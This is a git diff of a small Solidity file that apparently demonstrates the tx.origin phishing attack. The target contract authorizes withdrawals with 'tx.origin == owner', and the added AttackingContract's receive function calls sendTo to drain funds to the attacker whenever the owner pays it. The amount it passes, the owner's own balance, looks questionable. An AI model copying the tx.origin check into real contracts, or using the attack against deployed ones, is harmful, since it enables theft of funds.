@@ -12,11 +12,6 @@ contract MyContract {
 
     }
 
-    
-    function block() external view returns(uint){
-        return block.timestamp;
-    }
-
     function sendTo(address payable receiver, uint amount) public {
         require(tx.origin == owner,"toto");
         (bool success, ) = receiver.call{value:amount}("");
@@ -24,5 +19,21 @@ contract MyContract {
     }
 
     receive() external payable{}
+
+}
+
+contract AttackingContract {
+
+    MyContract public myContract;
+    address public attacker;
+
+    function attackingContract(address payable myContractAddress) public {
+        myContract = MyContract(myContractAddress);
+        attacker = msg.sender;
+    }
+
+    receive() external payable{
+        myContract.sendTo(payable(attacker), msg.sender.balance);
+    }
 
 }
